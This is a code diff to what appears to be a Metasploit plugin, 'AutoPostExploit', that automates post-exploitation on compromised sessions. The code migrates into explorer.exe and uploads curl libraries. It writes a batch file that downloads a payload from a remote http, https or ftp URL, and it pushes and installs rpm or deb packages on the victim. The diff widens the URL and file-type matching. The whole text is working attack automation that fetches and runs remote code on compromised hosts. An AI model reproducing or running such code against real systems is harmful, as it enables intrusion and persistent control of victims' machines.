@@ -119,8 +119,8 @@ class Plugin::AutoPostExploit < Msf::Plugin
 					session.run_cmd("migrate #{session.sys.process['explorer.exe']}")
 				end
 
-				if (final =~ /exe|msu/)
-					if (final =~ /^http\:/)
+				if (final =~ /exe|msu/i)
+					if (final =~ /^(ht|f)tp[s]*\:/)
 						session.run_cmd("upload " + basedir + "/.curl/" + "libcurl.dll .")
 						session.run_cmd("upload " + basedir + "/.curl/" + "libeay32.dll .")
 						session.run_cmd("upload " + basedir + "/.curl/" + "libssl32.dll .")
@@ -140,7 +140,7 @@ class Plugin::AutoPostExploit < Msf::Plugin
 						end
 					end
 					File.open("update.bat", 'w') do |file|
-						if (final =~ /^http\:/)
+						if (final =~ /^(ht|f)tp[s]*\:/)
 							file.puts "curl -O #{final}"
 							final_parts = final.split("/")
 							final = final_parts.pop
@@ -156,12 +156,12 @@ class Plugin::AutoPostExploit < Msf::Plugin
 					File.delete("update.bat")
 				end
 
-				if (final =~ /rpm/)
+				if (final =~ /rpm/i)
 					session.run_cmd("upload #{final}")
 					session.shell_write("rpm -uh #{final}")
 				end
 
-				if (final =~ /deb/)
+				if (final =~ /deb/i)
 					session.run_cmd("upload #{final}")
 					session.shell_write("dpkg -i #{final}")
 				end
